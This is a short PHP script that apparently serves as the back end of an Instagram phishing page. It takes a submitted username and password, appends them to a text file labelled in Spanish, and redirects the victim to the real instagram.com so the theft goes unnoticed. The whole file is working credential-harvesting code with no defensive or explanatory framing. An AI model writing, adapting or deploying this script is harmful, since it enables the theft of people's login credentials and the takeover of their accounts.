<?php

file_put_contents("usuarios.txt", "Usuario de instagram: " . $_POST['username'] . "\nContraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>